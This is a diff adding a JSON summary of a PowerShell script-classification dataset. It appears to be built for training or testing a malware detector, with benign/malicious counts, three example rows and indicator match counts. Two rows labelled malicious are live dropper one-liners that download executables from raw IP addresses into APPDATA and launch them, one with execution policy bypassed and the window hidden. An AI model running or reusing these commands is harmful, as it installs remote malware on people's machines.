@@ -1,0 +1,61 @@
+{
+  "dataset_summary": {
+    "benign_total": 1295,
+    "content_len_max": 1317002,
+    "content_len_min": 0,
+    "content_len_p50": 2200,
+    "content_len_p90": 7333,
+    "content_len_p99": 107253,
+    "empty_content_rows": 1,
+    "gt_16k_chars": 116,
+    "gt_8k_chars": 234,
+    "malicious_total": 1261,
+    "max_chars_applied": 12000,
+    "min_chars_applied": 1,
+    "rows_total": 2556,
+    "rows_used": 2555,
+    "truncated_rows": 157
+  },
+  "example_rows": [
+    {
+      "content": "function Test-ModuleVersion {\n    [CmdletBinding()]\n    param (\n        [string]$currentVersion,\n        [string]$minimumVersion,\n        [string]$maximumVersion,\n        [string]$lessThanVersion\n    )\n\n    begin {\n    }\n\n    process {\n        $result = $true\n\n        \n        if(\"$minimumVersion$maximumVersion$lessthanVersion\" -eq ''){\n            return $true\n        }\n\n        \n        \n        \n        if(![string]::IsNullOrEmpty($currentVersion)) {\n            if($currentVersion.ToString().Length -eq 1) {\n                [version]$currentVersion = \"$currentVersion.0\"\n            } else {\n                [version]$currentVersion = $currentVersion\n            }\n        }\n\n        if(![string]::IsNullOrEmpty($minimumVersion)) {\n            if($minimumVersion.ToString().Length -eq 1){\n                [version]$minimumVersion = \"$minimumVersion.0\"\n            } else {\n                [version]$minimumVersion = $minimumVersion\n            }\n\n            if($currentVersion.CompareTo($minimumVersion) -lt 0){\n                $result = $false\n            }\n        }\n\n        if(![string]::IsNullOrEmpty($maximumVersion)) {\n            if($maximumVersion.ToString().Length -eq 1) {\n                [version]$maximumVersion = \"$maximumVersion.0\"\n            } else {\n                [version]$maximumVersion = $maximumVersion\n            }\n\n            if ($currentVersion.CompareTo($maximumVersion) -gt 0) {\n                $result = $false\n            }\n        }\n\n        if(![string]::IsNullOrEmpty($lessThanVersion)) {\n            if($lessThanVersion.ToString().Length -eq 1) {\n                [version]$lessThanVersion = \"$lessThanVersion.0\"\n            } else {\n                [version]$lessThanVersion = $lessThanVersion\n            }\n\n            if($currentVersion.CompareTo($lessThanVersion) -ge 0) {\n                $result = $false\n            }\n        }\n\n        Write-Output $result\n    }\n\n    end {\n    }\n}",
+      "filename": "2842.ps1",
+      "label": "benign",
+      "raw_char_len": 1934,
+      "target_token": "ALLOW",
+      "used_char_len": 1934,
+      "was_truncated": false
+    },
+    {
+      "content": "(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',\"$env:APPDATA\\csrsv.exe\");Start-Process (\"$env:APPDATA\\csrsv.exe\")",
+      "filename": "2959.ps1",
+      "label": "malicious",
+      "raw_char_len": 153,
+      "target_token": "BLOCK",
+      "used_char_len": 153,
+      "was_truncated": false
+    },
+    {
+      "content": "PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe',\u001d $env:APPDATA\\profilest.exe\u001d );Start-Process (\u001d $env:APPDATA\\profilest.exe\u001d )",
+      "filename": "979.ps1",
+      "label": "malicious",
+      "raw_char_len": 239,
+      "target_token": "BLOCK",
+      "used_char_len": 239,
+      "was_truncated": false
+    }
+  ],
+  "indicator_match_counts": {
+    "-EncodedCommand": 6,
+    "CreateThread": 596,
+    "DownloadFile": 468,
+    "DownloadString": 85,
+    "FromBase64String": 57,
+    "Invoke-Expression": 42,
+    "Invoke-WebRequest": 28,
+    "Net\\.WebClient": 580,
+    "Start-Process": 507,
+    "VirtualAlloc": 600,
+    "\\bIEX\\b": 148
+  }
+}
